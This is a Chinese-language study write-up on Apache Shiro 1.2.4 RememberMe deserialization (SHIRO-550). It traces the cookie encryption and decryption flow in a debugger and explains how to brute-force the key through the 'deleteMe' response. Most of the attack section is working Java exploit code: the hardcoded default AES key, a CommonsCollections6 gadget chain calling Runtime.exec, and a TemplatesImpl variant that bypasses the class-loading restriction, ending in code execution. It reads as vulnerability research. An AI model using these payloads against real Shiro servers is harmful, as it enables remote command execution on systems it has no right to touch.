S-shiro550
前言
环境搭建
1. 参考文章：
Shiro 反序列化记录 
Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞
2. 远程调试：
tomcat 启动修改，新建 debug.bat 文件，内容如下。
IDEA 配置远程 Tomcat 服务器。 
set JPDA_ADDRESS=8000
set JPDA_TRANSPORT=dt_socket
set CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -
Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000
startup
基本流程跟踪
1. 登录功能触发点： org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin
2. 触发时堆栈情况：
3. 踩坑
此处需要配置 RememberMeManager ，不然此处为空无法进入 onSuccessfulLogin 方法，之前一
直尝试不使用 web 进行配置，失败了。。。。 
需要勾选 rememberMe 字段，也就是 this.isRememberMe(token) 不为空 
加密过程跟踪调试
1. 通过上面的 onSuccessfulLogin 方法之后，如果 isRememberMe 不为空，则进入到
rememberIdentity 方法当中。 
2. 进入该函数之后获取一个 principals 属性，该属性实际是登录时传递的用户名 root ，之后再进
入到 rememberIndentity 方法当中。 
3. 在 rememberIdentity 方法中，首先调用 convertPrincipalsToBytes 方法，将 principals 进
行处理，处理第一步是进行序列化，也就是 serialize 方法，这个方法最终调用的是
org.apache.shiro.io.DefaultSerializer.class#serialze 方法 
4. 在完成序列化之后会再返回 convertPrincipalsToBytes 方法，对字节数组调用 encrypt 方法进
行加密。 AbstractRememberMeManager.class#encrypt  
5. 在 encrypt 方法中，首先是获取加密服务，而这个加密服务是一个 AES 加密算法，之后首先通过
getEncryptionCipherKey 方法获取加密密钥，然后进入 encrypt 方法。 
6. 在 JcaCipherService.class 中，最终调用本类的 encrypt 方法进行加密，最后返回结果。 
7. 然后返回结果，再次回到 rememberIdentity 方法中，进入 rememberSerializedIdentity 方
法，该方法的具体实现类是 CookieRememberMeManager.class#rememberSerializedIdentity  
8. 这个方法的主要作用是对 AES 加密后的数据进行 base64 编码，然后返回存入 cookie 当中。 
解密过程跟踪调试
1. 首先在加密过程中调用的 AbstractRememberMeManager.class 类中找到 decrypt 方法，这个也
是解密调用的函数。下断点查看堆栈的调用情况。
2. 当我们发起请求访问时，会根据是否存在 rememberMe 字段进行一系列的判断。如果请求中存在
rememberMe 字段，则会对传递的这个 cookie 值进行获取，解密等一系列操作。具体的实现体现
在 AbstractRememberMeManager.class#getRememberedPrincipals 方法中，通过这个方法去判
断是否存在 rememberMe 字段，并且从 cookie 中获取该字段值。 
3. 具体跟进，查看详情。在第86行获取到请求中的 rememberMe 字段值，然后进行 base64 解码后返
回。返回上一步后的 bytes 数组不为空直接进行下一步的解密处理，否则直接返回空。 
4. 此处 bytes 数组不为空，进入 convertBytesToPrincipals 函数，跟踪进入。在第137行进入解
密过程，解密完成后返回结果。
5. 但此时，我们的数据是错误的，使用密钥无法解密，则会产生一个报错，进入到
AbstractRememberMeManager.class#getRememberedPrincipals 方法的 catch 当中。也就是
onRememberedPrincipalFailure 函数。这个函数经过一系列的函数调用，最后会在响应头中返
回 rememberMe=deleteMe 的 set-cookie 属性。 
6. 在之前登录过程中，如果登录成功，且勾选 rememberMe 之后会返回一个正常的序列化数据流，我
们使用这个流来进行后续密码正确的过程追踪。
7. 承接上回的解密过程，当解密成功之后，返回数据，之后进入到反序列化过程。
8. 跟进反序列化的方法，查看到反序列化的类应该是
org.apache.shiro.subject.SimplePrincipalCollection ，与序列化的过程也是吻合的。 
9. 此处有一个点， return 返回后的序列化流有一个强制类型转换，变成 PrincipalCollection 类
型，转换出错则抛出异常。
10. 到此已经追踪到反序列化的过程了，在此处将反序列化的流换成 payload 的序列化流，就可以触发
反序列化漏洞。
攻击实验
密钥爆破
通过实现shiro的反序列化原理流程，进行密钥爆破
构造链尝试
这里有一点就是我们在进行密钥爆破时因为要通过响应字段是否包含 deleteMe 来判断密钥是否爆
破成功，所以我们序列化的对象必须是 SimplePrincipalCollection ，否则在反序列化之后的
强制类型转换会爆出异常，导致响应字段包含 deleteMe 。但是在进行构造链时不需要考虑这个问
题，因为是先进行的反序列化，此时构造链已经执行完毕，即使后面再爆出异常也不会造成影响。
cc6构造链
package com.shiro;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;
import javax.xml.bind.DatatypeConverter;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
public class encrypt_ {
    private static final byte[] 
 encryptKey=DatatypeConverter.parseBase64Binary("kPH+bIxk5D2deZiIxcaaaA==");
    private static CipherService cipherService = new AesCipherService();
    public static void main(String[] args) throws Exception {
        SimplePrincipalCollection simplePrincipalCollection = new 
SimplePrincipalCollection();
        ByteArrayOutputStream var1 = new ByteArrayOutputStream();
        ObjectOutputStream var2 = new ObjectOutputStream(var1);
        var2.writeObject(simplePrincipalCollection);
        ByteSource encrypt = cipherService.encrypt(var1.toByteArray(), 
encryptKey);
        System.out.println(new String(var1.toByteArray()));
        String s = encrypt.toBase64();
        System.out.println(s);
        //decrypt_();
    }
}
public class CommonsCollections6 {
    public static byte[] getPayload(String command) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new 
ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
加密构造链，生成最终的payload
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { command }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();
//        ByteArrayInputStream arrayInputStream = new 
ByteArrayInputStream(barr.toByteArray());
//        ObjectInputStream objectInputStream = new 
ObjectInputStream(arrayInputStream);
//        objectInputStream.readObject();
        return barr.toByteArray();
    }
//    public static void main(String[] args) throws Exception {
//        getPayload("calc.exe");
//    }
}
public class encrypt_ {
    private static final byte[] 
 encryptKey=Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
    private static CipherService cipherService = new AesCipherService();
    public static void main(String[] args) throws Exception {
        byte[] payloads=CommonsCollections6.getPayload("calc.exe");
        ByteSource encrypt = cipherService.encrypt(payloads, encryptKey);
        System.out.println(new String(payloads));
        String s = encrypt.toBase64();
        System.out.println(s);
        //decrypt_();
    }
}
发送payload，出现报错信息。 
找到报错信息的位置， ClassResolvingObjectInputStream  
这个类是 ObjectInputStream 的子类，重写了 resolveClass 方法。 resolveClass 是反序列化
中用来查找类的方法，简单来说，读取序列化流的时候，读到一个字符串形式的类名，需要通过这
个方法来找到对应的 java.lang.Class 对象。对比一下父类的 resolveClass 方法。
区别就再获取类对象的方式上面，重写之后，获取类对象使用的 ClassUtils.forName 方法，调
用链 ClassUtils.forName -> THREAD_CL_ACCESSOR.loadClass(fqcn) -
> ClassUtils.ExceptionIgnoringAccessor#loadClass -> this.getClassLoader()-
>loadClass ，它获取了当前的类加载器，而当前类加载器应该是
org.apache.catalina.loader.ParallelWebappClassLoader#loadClass ，而不是原生的
Class.forName .
进一步查看报错信息
通过 tomcat 日志，进一步查看报错的日志信息，发现这个错误
[org.apache.shiro.util.ClassUtils]: Unable to load clazz named 
[[Lorg.apache.commons.collections.Transformer;] from class loader 
[ParallelWebappClassLoader 。参考文章：强网杯“Shiro 1.2.4(SHIRO-550)漏洞之发散性思考    
Shiro-1.2.4-RememberMe 反序列化踩坑深入分析    最后的结论就是：如果反序列化流中包含非
Java自身的数组，则会出现无法加载类的错误。这就解释了为什么 CommonsCollections6 无法利
用了，因为其中用到了 Transformer 数组。
构造不包含数组的payload
在之前CC6的适应 TemplatesImpl 改造中已经实现了不含 Transformer 数组的功能，因此我们只
需将之前适应性改造的任意代码换成我们想执行的代码，然后重造payload既可。
编写执行代码的 class 文件，然后转换为字节码 
public static byte[] fileToByte() throws IOException {  //文件转字节
        File file = new 
File("E:\\ysoserial\\src\\main\\java\\TemplatesImpl_\\RumCmd.class");
        FileInputStream inputStream = new FileInputStream(file);
        ByteArrayOutputStream byteArrayOutputStream = new 
ByteArrayOutputStream();
        byte[] bytes = new byte[1024];
        int n;
        while ((n=inputStream.read(bytes))!=-1){
            byteArrayOutputStream.write(bytes,0,n);
        }
新的CC6代码
        inputStream.close();
        byteArrayOutputStream.close();
        return byteArrayOutputStream.toByteArray();
    }
package com.shiro;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
public class CommonsCollections6 {
    public static byte[] getPayload(String command) throws Exception {
        byte[] codeRunCmd = TemplatesImpl_.fileToByte();
        TemplatesImpl templates = new TemplatesImpl();
        TemplatesImpl_.setFieldValue(templates,"_name","RunCmd");
        TemplatesImpl_.setFieldValue(templates,"_bytecodes",new byte[][]
{codeRunCmd});
        TemplatesImpl_.setFieldValue(templates,"_tfactory",new 
TransformerFactoryImpl());
        InstantiateTransformer instantiateTransformer = new 
InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        HashMap innerMap_ = new HashMap();
        Map outerMap_ = LazyMap.decorate(innerMap_, instantiateTransformer);
        TiedMapEntry tiedMapEntry_ = new TiedMapEntry(innerMap_, 
TrAXFilter.class);
        HashMap inmap_ = new HashMap();
        inmap_.put(tiedMapEntry_,"key1");
        Field map = tiedMapEntry_.getClass().getDeclaredField("map");
        map.setAccessible(true);
        map.set(tiedMapEntry_,outerMap_);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(inmap_);
        oos.close();
        return barr.toByteArray();
    }
}
发送payload之后成功弹出计算器